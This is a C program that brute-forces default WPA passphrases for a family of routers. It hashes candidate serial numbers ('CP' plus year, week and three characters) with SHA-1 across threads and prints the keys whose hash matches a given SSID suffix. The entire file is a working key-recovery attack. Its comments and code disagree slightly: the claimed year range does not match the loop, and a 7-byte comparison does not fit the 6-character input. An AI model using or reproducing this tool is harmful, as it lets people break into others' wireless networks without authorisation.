#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <stdint.h>

#include <pthread.h>
#include <openssl/sha.h>

#define YEAR_BEGIN_NUM 2 //This "hack" is known to work with models made during the year 2002
#define NUM_OF_YEARS 8  //and work for all models made up to and including 2010. 2 + 8 = 10

//used to convert a hexidecimal number to a hexidecimal string
//0xAC => "0xAC" 
char *lookup_hex[] = { 
	"00", "01", "02", "03", "04", 
	"05", "06", "07", "08", "09", 
	"0A", "0B", "0C", "0D", "0E", 
	"0F", "10", "11", "12", "13", 
	"14", "15", "16", "17", "18", 
	"19", "1A", "1B", "1C", "1D", 
	"1E", "1F", "20", "21", "22", 
	"23", "24", "25", "26", "27", 
	"28", "29", "2A", "2B", "2C", 
	"2D", "2E", "2F", "30", "31", 
	"32", "33", "34", "35", "36", 
	"37", "38", "39", "3A", "3B", 
	"3C", "3D", "3E", "3F", "40", 
	"41", "42", "43", "44", "45", 
	"46", "47", "48", "49", "4A", 
	"4B", "4C", "4D", "4E", "4F", 
	"50", "51", "52", "53", "54", 
	"55", "56", "57", "58", "59", 
	"5A", "5B", "5C", "5D", "5E", 
	"5F", "60", "61", "62", "63", 
	"64", "65", "66", "67", "68", 
	"69", "6A", "6B", "6C", "6D", 
	"6E", "6F", "70", "71", "72", 
	"73", "74", "75", "76", "77", 
	"78", "79", "7A", "7B", "7C", 
	"7D", "7E", "7F", "80", "81", 
	"82", "83", "84", "85", "86", 
	"87", "88", "89", "8A", "8B", 
	"8C", "8D", "8E", "8F", "90", 
	"91", "92", "93", "94", "95", 
	"96", "97", "98", "99", "9A", 
	"9B", "9C", "9D", "9E", "9F", 
	"A0", "A1", "A2", "A3", "A4", 
	"A5", "A6", "A7", "A8", "A9", 
	"AA", "AB", "AC", "AD", "AE", 
	"AF", "B0", "B1", "B2", "B3", 
	"B4", "B5", "B6", "B7", "B8", 
	"B9", "BA", "BB", "BC", "BD", 
	"BE", "BF", "C0", "C1", "C2", 
	"C3", "C4", "C5", "C6", "C7", 
	"C8", "C9", "CA", "CB", "CC", 
	"CD", "CE", "CF", "D0", "D1", 
	"D2", "D3", "D4", "D5", "D6", 
	"D7", "D8", "D9", "DA", "DB", 
	"DC", "DD", "DE", "DF", "E0", 
	"E1", "E2", "E3", "E4", "E5", 
	"E6", "E7", "E8", "E9", "EA", 
	"EB", "EC", "ED", "EE", "EF", 
	"F0", "F1", "F2", "F3", "F4", 
	"F5", "F6", "F7", "F8", "F9", 
	"FA", "FB", "FC", "FD", "FE", 
	"FF"
};

/* Will point to a string entered by the user used in calculations
 * each thread performs. Should only be read from the threads. 
 */ 
const char *ident;

void usage(const char *name)
{
	printf("Usage: %s ssid_identifier\nExample ssid_identifier: CDEA15\n", name);
}

// Convert a sha1 hash to a hexidecimal string
void sha1_to_str(unsigned char *sha1, char *str)
{
	for (int i = 0; i < 20; i++)
	{
		memcpy(str + (i*2), lookup_hex[(int)sha1[i]], 2);
	}
}

//transform all characters of a string into uppercase characters
void str_to_upper(char *str)
{
	for (int i = 0; i < strlen(str); i++)
	{
		str[i] = toupper(str[i]);
	}
}

/* Run from a thread. 
 * arg should point to an integer containing the year number
 * to calculate the wpa keys for.
 * Will check if the WPA keys could be valid for 
 */
void *calc_wpa_key(void *arg)
{
	//Possible characters that make up the key
	const char chars[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
	
	int year = *((int *)arg);
	char str[3];
	char serial[13];
	unsigned char sha1_out[20];
	char sha1_out_str[41];
	
	for (int week = 1; week < 53; week++) //53 = maximum number of weeks in a year.
	{
		for (int i = 0; i < 36; i++) //36 = amount of possible characters (sizeof chars).
		{
			for (int j = 0; j < 36; j++)
			{
				for (int k = 0; k < 36; k++)
				{
					str[0] = chars[i];
					str[1] = chars[j];
					str[2] = chars[k];
					
					sprintf(serial, "CP%02d%02d%X%X%X", year, week, str[0], str[1], str[2]);
					
					SHA1((const unsigned char*)serial, strlen(serial), sha1_out);
					sha1_to_str(sha1_out, sha1_out_str);
					
					if (memcmp(&sha1_out_str[40] - 6, ident, 7) == 0)
					{
						sha1_out_str[10] = '\0';

						printf("Possible Key Found: %s\n", sha1_out_str);
					}
				}
			}
		}
	}
	
	return NULL;
}

int main(int argc, char *argv[])
{
	
	if (argc != 2)
	{
		usage(argv[0]);
		return EXIT_FAILURE;
	}
	
	if (strlen(argv[1]) != 6)
	{
		usage(argv[0]);
		return EXIT_FAILURE;
	}
	
	str_to_upper(argv[1]);
	ident = argv[1];
	
	pthread_t thread[NUM_OF_YEARS];
	int year[NUM_OF_YEARS];
	for (int i = 0; i < NUM_OF_YEARS; i++)
	{
		year[i] = YEAR_BEGIN_NUM + i;
		if(pthread_create(&thread[i], NULL, &calc_wpa_key, &year[i]))
		{
    		printf("Error creating thread\n");
        	return EXIT_FAILURE;
		}
	}
	
	for (int i = 0; i < NUM_OF_YEARS; i++)
	{
		pthread_join(thread[i], NULL);
	}

	return EXIT_SUCCESS;
}
